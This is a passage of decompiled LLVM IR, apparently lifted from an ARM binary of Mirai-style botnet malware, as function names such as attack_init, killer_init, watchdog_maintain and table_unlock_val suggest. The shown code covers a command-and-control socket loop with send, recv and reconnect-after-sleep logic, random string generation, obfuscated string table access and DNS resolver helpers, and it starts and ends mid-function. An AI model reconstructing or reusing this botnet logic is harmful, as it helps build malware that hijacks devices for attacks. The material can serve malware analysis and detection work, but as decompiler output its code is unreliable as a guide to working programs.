  %v2_dfb4 = load i32, i32* @global_var_220bc.110, align 4
  %v1_dfb8 = call i32 @__GI___libc_close(i32 %v2_dfb4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dfc0 = load i32, i32* @r4, align 4
  %v2_dfc0 = inttoptr i32 %v1_dfc0 to i32*
  store i32 -1, i32* %v2_dfc0, align 4
  %v0_dfc4 = call i32 @rand_next()
  %v3_dfcc = zext i32 %v0_dfc4 to i64
  %v4_dfcc = mul nuw i64 %v3_dfcc, 3435973837
  %v3_dfd02 = udiv i64 %v4_dfcc, 34359738368
  %v3_dfd44 = mul nuw nsw i64 %v3_dfd02, 8
  %v3_dfd4 = trunc i64 %v3_dfd44 to i32
  store i32 %v3_dfd4, i32* %r2.global-to-local, align 4
  %v2_dfd86 = mul nuw nsw i64 %v3_dfd02, 2
  %v2_dfd8 = trunc i64 %v2_dfd86 to i32
  %v2_dfdc = add i32 %v3_dfd4, %v2_dfd8
  store i32 %v2_dfdc, i32* %r3.global-to-local, align 4
  %v2_dfe0 = sub i32 %v0_dfc4, %v2_dfdc
  %v1_dfe4 = add i32 %v2_dfe0, 1
  %v1_dfe8 = call i32 @sleep(i32 %v1_dfe4)
  br label %dec_label_pc_dc0c

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dd18
  %v2_dff4 = load i32, i32* @global_var_220bc.110, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e004 = call i32 @__libc_send(i32 %v2_dff4, i32 %v2_dff8, i32 2, i32 16384)
  br label %dec_label_pc_dd44

dec_label_pc_e00c:                                ; preds = %dec_label_pc_de80, %dec_label_pc_de14
  %v0_e00c = load i32, i32* @r5, align 4
  %v1_e00c = inttoptr i32 %v0_e00c to i32*
  %v2_e00c = load i32, i32* %v1_e00c, align 4
  store i32 %v2_e00c, i32* %r3.global-to-local, align 4
  %v7_e010 = icmp eq i32 %v2_e00c, 4
  br i1 %v7_e010, label %dec_label_pc_dc0c, label %bb45

bb45:                                             ; preds = %dec_label_pc_e00c
  %v8_e014 = icmp eq i32 %v2_e00c, 11
  br i1 %v8_e014, label %dec_label_pc_dc0c, label %dec_label_pc_e01c

dec_label_pc_e01c:                                ; preds = %bb45, %dec_label_pc_dea0, %dec_label_pc_de4c
  %v2_e01c = load i32, i32* @global_var_220bc.110, align 4
  store i32 57384, i32* @lr, align 4
  %v1_e024 = icmp ne i32 %v2_e01c, -1
  call void @__pseudo_cond_branch(i1 %v1_e024, i32 ptrtoint (i32* @global_var_146d0.113 to i32))
  store i32 ptrtoint (i32* @global_var_220bc.110 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_220bc.110, align 4
  %v1_e038 = call i32 @sleep(i32 1)
  br label %dec_label_pc_dc0c

dec_label_pc_e040:                                ; preds = %dec_label_pc_df7c
  %v2_e048 = call i32 @util_strlen(i8* %v1_e048)
  %sext = mul i32 %v2_e048, 16777216
  %v1_e04c = sdiv i32 %sext, 16777216
  %v7_e04c = inttoptr i32 %v1_e04c to i8*
  store i8* %v7_e04c, i8** %stack_var_-42, align 4
  %v0_e050 = call i32 @util_local_addr()
  store i32 %v0_e050, i32* @global_var_24d4c.56, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e064 = load i32, i32* @r5, align 4
  store i32 %v0_e064, i32* %r2.global-to-local, align 4
  %v2_e068 = load i32, i32* @global_var_220bc.110, align 4
  %v4_e06c = call i32 @__libc_send(i32 %v2_e068, i32 ptrtoint (i32* @global_var_19718.117 to i32), i32 %v0_e064, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_e078 = load i32, i32* @global_var_220bc.110, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e084 = call i32 @__libc_send(i32 %v2_e078, i32 %v2_dff8, i32 1, i32 16384)
  %v3_e088 = load i8*, i8** %stack_var_-42, align 4
  %v4_e088 = ptrtoint i8* %v3_e088 to i32
  store i32 %v4_e088, i32* %r2.global-to-local, align 4
  %v3_e08c = icmp eq i8* %v3_e088, null
  br i1 %v3_e08c, label %dec_label_pc_dc0c, label %dec_label_pc_e094

dec_label_pc_e094:                                ; preds = %dec_label_pc_e040
  %v2_e098 = load i32, i32* @global_var_220bc.110, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e0a4 = call i32 @__libc_send(i32 %v2_e098, i32 %v2_da48, i32 %v4_e088, i32 16384)
  br label %dec_label_pc_dc0c

dec_label_pc_e0ac:                                ; preds = %dec_label_pc_de54
  %v2_e0b0 = load i32, i32* @global_var_220bc.110, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_e0bc = add i32 %v4_de58, 16384
  store i32 %v1_e0bc, i32* %r3.global-to-local, align 4
  %v4_e0c0 = call i32 @__libc_recv(i32 %v2_e0b0, i32 %v2_dff8, i32 2, i32 %v1_e0bc)
  br label %dec_label_pc_dc0c

dec_label_pc_e0c8:                                ; preds = %dec_label_pc_de64
  %v2_e0c8 = load i32, i32* @global_var_220bc.110, align 4
  %v1_e0cc = call i32 @__GI___libc_close(i32 %v2_e0c8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e0d4 = load i32, i32* @r8, align 4
  %v2_e0d4 = inttoptr i32 %v1_e0d4 to i32*
  store i32 -1, i32* %v2_e0d4, align 4
  br label %dec_label_pc_dc0c

; uselistorder directives
  uselistorder i32 %v3_df18, { 1, 3, 2, 0 }
  uselistorder i8* %v3_def4, { 1, 0 }
  uselistorder i32 %v5_ded0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_de94, { 1, 0 }
  uselistorder i32 %v5_de6c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_de58, { 2, 0, 1, 3 }
  uselistorder i32 %v4_de40, { 1, 0 }
  uselistorder i32 %v2_dddc, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_dd20, { 1, 0, 2 }
  uselistorder i32 %v2_dd1c, { 2, 0, 1 }
  uselistorder i32 %v5_dd04, { 1, 2, 0 }
  uselistorder i32 %v2_dc48, { 2, 1, 0 }
  uselistorder i32 %v1_dc3c, { 1, 2, 0 }
  uselistorder i32 %v1_dc20, { 1, 2, 0 }
  uselistorder i32 %v2_dff8, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_dd30, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_dc08, { 1, 0, 2 }
  uselistorder i32 %v2_daa4, { 0, 10, 1, 11, 2, 9, 3, 4, 8, 7, 5, 12, 6 }
  uselistorder i32 %v2_da8c, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 9 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i8** @global_var_2223c.111 to i32), { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2223c.111 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_220bc.110, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* @global_var_220b8.86, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_220c0.84, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d834.82 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_24d58.93 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_dd44, { 2, 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_dc8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dc7c, { 1, 0 }
  uselistorder label %dec_label_pc_dc0c, { 7, 8, 9, 1, 10, 2, 0, 11, 12, 3, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_da5c, { 2, 0, 1 }
}

define i32 @function_e104(i32 %arg1) local_unnamed_addr {
dec_label_pc_e104:
  %v0_e104 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e104, i32 -22312008)
  %v0_e10c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e10c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_e104
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_e104, %bb
  %v10_e10c = load i32, i32* @r0, align 4
  ret i32 %v10_e10c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e11c = load i32, i32* @global_var_22240.119, align 4
  %v2_e120 = load i32, i32* @global_var_2224c.121, align 4
  %v4_e12c = mul i32 %v2_e11c, 2048
  %v5_e12c = xor i32 %v4_e12c, %v2_e11c
  store i32 %v5_e12c, i32* @r3, align 4
  %v4_e130 = udiv i32 %v2_e120, 524288
  %v5_e130 = xor i32 %v4_e130, %v2_e120
  %v2_e134 = load i32, i32* @global_var_22244.123, align 4
  %v2_e138 = load i32, i32* @global_var_22248.125, align 4
  %v2_e13c = xor i32 %v5_e130, %v5_e12c
  %v4_e140 = udiv i32 %v5_e12c, 256
  %v5_e140 = xor i32 %v2_e13c, %v4_e140
  store i32 %v2_e134, i32* @global_var_22240.119, align 4
  store i32 %v2_e138, i32* @global_var_22244.123, align 4
  store i32 %v2_e120, i32* @global_var_22248.125, align 4
  store i32 %v5_e140, i32* @global_var_2224c.121, align 4
  ret i32 %v5_e140

; uselistorder directives
  uselistorder i32 %v2_e120, { 2, 1, 0 }
  uselistorder i32 %v2_e11c, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e178 = call i32 @__GI_time(i32* null)
  store i32 %v2_e178, i32* @global_var_22240.119, align 4
  %v1_e184 = call i32 @__getpid(i32 %v2_e178)
  store i32 %v1_e184, i32* @r0, align 4
  %v0_e18c = call i32 @getppid()
  %v2_e194 = xor i32 %v1_e184, %v0_e18c
  store i32 %v2_e194, i32* @global_var_22244.123, align 4
  %v1_e19c = call i32 @clock(i32 %v2_e194)
  %v2_e1a0 = load i32, i32* @global_var_22244.123, align 4
  %v2_e1ac = xor i32 %v2_e1a0, %v1_e19c
  store i32 %v2_e1ac, i32* @global_var_2224c.121, align 4
  store i32 %v1_e19c, i32* @global_var_22248.125, align 4
  ret i32 %v1_e19c

; uselistorder directives
  uselistorder i32 %v1_e19c, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e1d4 = load i32, i32* @r4, align 4
  %v6_e1d4 = load i32, i32* @r5, align 4
  %v9_e1d4 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e1e8 = call i32 @table_unlock_val(i32 28)
  %v3_e1f4 = call i32 @table_retrieve_val(i32 28, i32* null)
  store i32 %v3_e1f4, i32* @r1, align 4
  %v2_e200 = bitcast i32* %stack_var_-72 to i8*
  %v3_e200 = call i32 @strcpy(i8* %v2_e200, i32 %v3_e1f4)
  %v2_e204 = icmp eq i32 %arg2, 0
  br i1 %v2_e204, label %dec_label_pc_e280, label %dec_label_pc_e20c

dec_label_pc_e20c:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22240.119 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.123 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22248.125 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2224c.121 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e264 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e220

dec_label_pc_e220:                                ; preds = %dec_label_pc_e220.dec_label_pc_e220_crit_edge, %dec_label_pc_e20c
  %v1_e244 = phi i32 [ %v1_e244.pre, %dec_label_pc_e220.dec_label_pc_e220_crit_edge ], [ ptrtoint (i32* @global_var_22240.119 to i32), %dec_label_pc_e20c ]
  %v2_e220 = load i32, i32* @global_var_2224c.121, align 4
  store i32 %v2_e220, i32* %r2.global-to-local, align 4
  %v2_e224 = load i32, i32* @global_var_22240.119, align 4
  %v4_e228 = udiv i32 %v2_e220, 524288
  %v5_e228 = xor i32 %v4_e228, %v2_e220
  %v4_e22c = mul i32 %v2_e224, 2048
  %v5_e22c = xor i32 %v4_e22c, %v2_e224
  %v2_e230 = xor i32 %v5_e228, %v5_e22c
  %v2_e234 = load i32, i32* @global_var_22244.123, align 4
  %v2_e238 = load i32, i32* @global_var_22248.125, align 4
  store i32 %v2_e238, i32* %ip.global-to-local, align 4
  %v4_e23c = udiv i32 %v5_e22c, 256
  %v5_e23c = xor i32 %v2_e230, %v4_e23c
  store i32 %v5_e23c, i32* @r4, align 4
  %v2_e244 = inttoptr i32 %v1_e244 to i32*
  store i32 %v2_e234, i32* %v2_e244, align 4
  %v0_e248 = load i32, i32* %ip.global-to-local, align 4
  %v1_e248 = load i32, i32* %r8.global-to-local, align 4
  %v2_e248 = inttoptr i32 %v1_e248 to i32*
  store i32 %v0_e248, i32* %v2_e248, align 4
  %v0_e24c = load i32, i32* %r2.global-to-local, align 4
  %v1_e24c = load i32, i32* %r7.global-to-local, align 4
  %v2_e24c = inttoptr i32 %v1_e24c to i32*
  store i32 %v0_e24c, i32* %v2_e24c, align 4
  %v0_e250 = load i32, i32* @r4, align 4
  %v1_e250 = load i32, i32* @r6, align 4
  %v2_e250 = inttoptr i32 %v1_e250 to i32*
  store i32 %v0_e250, i32* %v2_e250, align 4
  %v2_e254 = call i32 @util_strlen(i8* %v2_e200)
  %v0_e25c = load i32, i32* @r4, align 4
  %v3_e260 = urem i32 %v0_e25c, %v2_e254
  %v2_e268 = add i32 %v3_e260, %v2_e264
  %v1_e26c = add i32 %v2_e268, -32
  %v2_e26c = inttoptr i32 %v1_e26c to i8*
  %v3_e26c = load i8, i8* %v2_e26c, align 1
  %v2_e270 = load i32, i32* @r5, align 4
  %v3_e270 = load i32, i32* %fp.global-to-local, align 4
  %v4_e270 = add i32 %v3_e270, %v2_e270
  %v5_e270 = inttoptr i32 %v4_e270 to i8*
  store i8 %v3_e26c, i8* %v5_e270, align 1
  %v0_e274 = load i32, i32* @r5, align 4
  %v1_e274 = add i32 %v0_e274, 1
  store i32 %v1_e274, i32* @r5, align 4
  %v1_e278 = load i32, i32* %sb.global-to-local, align 4
  %v9_e278 = icmp eq i32 %v1_e274, %v1_e278
  br i1 %v9_e278, label %dec_label_pc_e280, label %dec_label_pc_e220.dec_label_pc_e220_crit_edge

dec_label_pc_e220.dec_label_pc_e220_crit_edge:    ; preds = %dec_label_pc_e220
  %v1_e244.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e220

dec_label_pc_e280:                                ; preds = %dec_label_pc_e220, %entry
  %v1_e284 = call i32 @table_lock_val(i32 28)
  store i32 %v3_e1d4, i32* @r4, align 4
  store i32 %v6_e1d4, i32* @r5, align 4
  store i32 %v9_e1d4, i32* @r6, align 4
  ret i32 %v1_e284

; uselistorder directives
  uselistorder i32 %v2_e224, { 1, 0 }
  uselistorder i32 %v2_e220, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e2a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e2a8 = load i32, i32* @r4, align 4
  store i32 %v3_e2a8, i32* %stack_var_-28, align 4
  %v0_e2ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e2ac, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e2a4, 1
  br i1 %tmp16, label %dec_label_pc_e354, label %dec_label_pc_e2b4

dec_label_pc_e2b4:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2224c.121 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22248.125 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.123 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22240.119 to i32), i32* %r6.global-to-local, align 4
  %v2_e2c4 = load i32, i32* @global_var_2224c.121, align 4
  store i32 %v2_e2c4, i32* %lr.global-to-local, align 4
  %v2_e2c8 = load i32, i32* @global_var_22248.125, align 4
  store i32 %v2_e2c8, i32* %r4.global-to-local, align 4
  %v2_e2cc = load i32, i32* @global_var_22244.123, align 4
  store i32 %v2_e2cc, i32* %r0.global-to-local, align 4
  %v2_e2d0 = load i32, i32* @global_var_22240.119, align 4
  br label %dec_label_pc_e2f4

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e314
  %v1_e2d8 = trunc i32 %v5_e304 to i16
  %v3_e2d8 = inttoptr i32 %v9_e308 to i16*
  store i16 %v1_e2d8, i16* %v3_e2d8, align 2
  %v4_e2d8 = load i32, i32* %r5.global-to-local, align 4
  %v5_e2d8 = add i32 %v4_e2d8, -2
  store i32 %v5_e2d8, i32* %r5.global-to-local, align 4
  %v0_e2dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e2dc

dec_label_pc_e2dc:                                ; preds = %.thread, %dec_label_pc_e2d8
  %v0_e2dc = phi i32 [ %v9_e30c, %.thread ], [ %v0_e2dc.pre, %dec_label_pc_e2d8 ]
  %v2_e2d85 = phi i32 [ %v12_e308, %.thread ], [ %v5_e2d8, %dec_label_pc_e2d8 ]
  %tmp17 = icmp slt i32 %v0_e2dc, 1
  br i1 %tmp17, label %dec_label_pc_e35c, label %dec_label_pc_e2e8

dec_label_pc_e2e8:                                ; preds = %dec_label_pc_e2dc
  %v0_e2e0 = load i32, i32* %r0.global-to-local, align 4
  %v0_e2e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e2e8, i32* %r0.global-to-local, align 4
  %v0_e2ec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e2ec, i32* %r4.global-to-local, align 4
  %v0_e2f0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e2f0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e2f4

dec_label_pc_e2f4:                                ; preds = %dec_label_pc_e2b4, %dec_label_pc_e2e8
  %v0_e340 = phi i32 [ %v2_e2cc, %dec_label_pc_e2b4 ], [ %v0_e2e8, %dec_label_pc_e2e8 ]
  %v9_e308 = phi i32 [ %v0_e2ac, %dec_label_pc_e2b4 ], [ %v2_e2d85, %dec_label_pc_e2e8 ]
  %v0_e320 = phi i32 [ %v0_e2a4, %dec_label_pc_e2b4 ], [ %v0_e2dc, %dec_label_pc_e2e8 ]
  %v0_e334 = phi i32 [ %v2_e2c4, %dec_label_pc_e2b4 ], [ %v0_e2f0, %dec_label_pc_e2e8 ]
  %v0_e330 = phi i32 [ %v2_e2d0, %dec_label_pc_e2b4 ], [ %v0_e2e0, %dec_label_pc_e2e8 ]
  %v4_e2f4 = mul i32 %v0_e330, 2048
  %v5_e2f4 = xor i32 %v4_e2f4, %v0_e330
  %v4_e2f8 = udiv i32 %v0_e334, 524288
  %v5_e2f8 = xor i32 %v4_e2f8, %v0_e334
  %v2_e2fc = xor i32 %v5_e2f8, %v5_e2f4
  %v4_e304 = udiv i32 %v5_e2f4, 256
  %v5_e304 = xor i32 %v2_e2fc, %v4_e304
  store i32 %v5_e304, i32* %r3.global-to-local, align 4
  %v7_e308 = icmp sgt i32 %v0_e320, 3
  br i1 %v7_e308, label %.thread, label %dec_label_pc_e314

.thread:                                          ; preds = %dec_label_pc_e2f4
  %v10_e308 = inttoptr i32 %v9_e308 to i32*
  store i32 %v5_e304, i32* %v10_e308, align 4
  %v11_e308 = load i32, i32* %r5.global-to-local, align 4
  %v12_e308 = add i32 %v11_e308, 4
  store i32 %v12_e308, i32* %r5.global-to-local, align 4
  %v8_e30c = load i32, i32* %r1.global-to-local, align 4
  %v9_e30c = add i32 %v8_e30c, -4
  store i32 %v9_e30c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e2dc

dec_label_pc_e314:                                ; preds = %dec_label_pc_e2f4
  %v7_e320 = icmp eq i32 %v0_e320, 1
  store i32 %v5_e304, i32* %r3.global-to-local, align 4
  %v1_e328 = add i32 %v0_e320, -2
  store i32 %v1_e328, i32* %r1.global-to-local, align 4
  br i1 %v7_e320, label %dec_label_pc_e330, label %dec_label_pc_e2d8

dec_label_pc_e330:                                ; preds = %dec_label_pc_e314
  store i32 %v5_e304, i32* %r3.global-to-local, align 4
  %v1_e340 = load i32, i32* %r6.global-to-local, align 4
  %v2_e340 = inttoptr i32 %v1_e340 to i32*
  store i32 %v0_e340, i32* %v2_e340, align 4
  %v0_e344 = load i32, i32* %r4.global-to-local, align 4
  %v1_e344 = load i32, i32* %r7.global-to-local, align 4
  %v2_e344 = inttoptr i32 %v1_e344 to i32*
  store i32 %v0_e344, i32* %v2_e344, align 4
  %v0_e348 = load i32, i32* %lr.global-to-local, align 4
  %v1_e348 = load i32, i32* %r8.global-to-local, align 4
  %v2_e348 = inttoptr i32 %v1_e348 to i32*
  store i32 %v0_e348, i32* %v2_e348, align 4
  %v0_e34c = load i32, i32* %r3.global-to-local, align 4
  %v1_e34c = load i32, i32* %sl.global-to-local, align 4
  %v2_e34c = inttoptr i32 %v1_e34c to i32*
  store i32 %v0_e34c, i32* %v2_e34c, align 4
  %v0_e350 = load i32, i32* %r3.global-to-local, align 4
  %v1_e350 = trunc i32 %v0_e350 to i8
  %v2_e350 = load i32, i32* %r5.global-to-local, align 4
  %v3_e350 = inttoptr i32 %v2_e350 to i8*
  store i8 %v1_e350, i8* %v3_e350, align 1
  br label %dec_label_pc_e354

dec_label_pc_e354:                                ; preds = %entry, %dec_label_pc_e35c, %dec_label_pc_e330
  %v2_e354 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e354, i32* @r4, align 4
  %v1_e358 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e358

dec_label_pc_e35c:                                ; preds = %dec_label_pc_e2dc
  %v0_e35c = load i32, i32* %r3.global-to-local, align 4
  %v1_e35c = load i32, i32* %sl.global-to-local, align 4
  %v2_e35c = inttoptr i32 %v1_e35c to i32*
  store i32 %v0_e35c, i32* %v2_e35c, align 4
  %v0_e360 = load i32, i32* %lr.global-to-local, align 4
  %v1_e360 = load i32, i32* %r8.global-to-local, align 4
  %v2_e360 = inttoptr i32 %v1_e360 to i32*
  store i32 %v0_e360, i32* %v2_e360, align 4
  %v0_e364 = load i32, i32* %r4.global-to-local, align 4
  %v1_e364 = load i32, i32* %r7.global-to-local, align 4
  %v2_e364 = inttoptr i32 %v1_e364 to i32*
  store i32 %v0_e364, i32* %v2_e364, align 4
  %v0_e368 = load i32, i32* %r0.global-to-local, align 4
  %v1_e368 = load i32, i32* %r6.global-to-local, align 4
  %v2_e368 = inttoptr i32 %v1_e368 to i32*
  store i32 %v0_e368, i32* %v2_e368, align 4
  br label %dec_label_pc_e354

; uselistorder directives
  uselistorder i32 %v9_e30c, { 1, 0 }
  uselistorder i32 %v12_e308, { 1, 0 }
  uselistorder i32 %v5_e304, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e330, { 1, 0 }
  uselistorder i32 %v0_e334, { 1, 0 }
  uselistorder i32 %v0_e320, { 1, 0, 2 }
  uselistorder i32 %v0_e2dc, { 1, 0 }
  uselistorder i32 %v0_e2a4, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_22240.119, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_22240.119 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_22244.123, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_22248.125, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_2224c.121, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e354, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e2f4, { 1, 0 }
}

define i32 @resolv_entries_free(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e380 = load i32, i32* @r4, align 4
  store i32 %v3_e380, i32* %stack_var_-8, align 4
  %v6_e380 = load i32, i32* @lr, align 4
  %v0_e384 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e384, i32* @r4, align 4
  %v2_e384 = icmp eq i32 %v0_e384, 0
  br i1 %v2_e384, label %dec_label_pc_e3a0, label %dec_label_pc_e38c

dec_label_pc_e38c:                                ; preds = %entry
  %v1_e38c = add i32 %v0_e384, 4
  %v2_e38c = inttoptr i32 %v1_e38c to i32*
  %v3_e38c = load i32, i32* %v2_e38c, align 4
  store i32 %v3_e38c, i32* %r0.global-to-local, align 4
  store i32 58264, i32* @lr, align 4
  %v1_e394 = icmp ne i32 %v3_e38c, 0
  call void @__pseudo_cond_branch(i1 %v1_e394, i32 ptrtoint (i32* @global_var_131f4.32 to i32))
  %v0_e398 = load i32, i32* @r4, align 4
  store i32 %v0_e398, i32* @r0, align 4
  %v0_e39c = call i32 @free()
  store i32 %v0_e39c, i32* %r0.global-to-local, align 4
  %v2_e3a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e3a0

dec_label_pc_e3a0:                                ; preds = %entry, %dec_label_pc_e38c
  %v1_e3a4 = phi i32 [ 0, %entry ], [ %v0_e39c, %dec_label_pc_e38c ]
  %v2_e3a0 = phi i32 [ %v3_e380, %entry ], [ %v2_e3a0.pre, %dec_label_pc_e38c ]
  store i32 %v2_e3a0, i32* @r4, align 4
  store i32 %v6_e380, i32* @lr, align 4
  ret i32 %v1_e3a4

; uselistorder directives
  uselistorder i32 %v0_e384, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_e3a0, { 1, 0 }
}

define i32 @resolv_lookup(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_e3a8 = load i32, i32* @r4, align 4
  %v6_e3a8 = load i32, i32* @r5, align 4
  %v9_e3a8 = load i32, i32* @r6, align 4
  %v12_e3a8 = load i32, i32* @r7, align 4
  %v15_e3a8 = load i32, i32* @r8, align 4
  %v18_e3a8 = load i32, i32* @sb, align 4
